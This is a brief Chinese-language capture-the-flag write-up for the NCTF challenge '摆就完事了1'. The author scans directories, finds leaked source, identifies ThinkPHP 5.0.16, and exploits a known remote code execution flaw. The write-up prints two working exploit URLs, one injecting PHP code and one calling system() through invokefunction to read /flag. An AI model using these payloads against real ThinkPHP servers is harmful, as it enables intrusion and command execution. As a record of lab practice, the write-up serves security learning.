NCTF-摆就完事了1 writeup

首次访问题目环境显示403 Forbidden

![web-1.1](\img\web-1.1.png)

先上dirsearch扫一波目录，看看有啥东西：

![web-1.2](\img\web-1.2.png)

发现有源码的压缩包，（还有个DS_Store文件泄漏，不过这里都有源码了。。），下载下来看看：

![web-1.3](\img\web-1.3.png)

tp的框架，emm,先看下版本，直接添加路径致报错查看版本号

![web-1.4](\img\web-1.4.png)

tp5.0.16,这个版本的tp有rce的nday,

尝试添加默认路由

`/public/index.php/index/index/index?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>`

`/public/index.php?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=cat${IFS}/flag`

![web-1.5](\img\web-1.5.png)

查看flag:

`<?php%20system("cat /flag");?>` `cat${IFS}/flag`

![web-1.6](\img\web-1.6.png)

![web-1.7](\img\web-1.7.png)
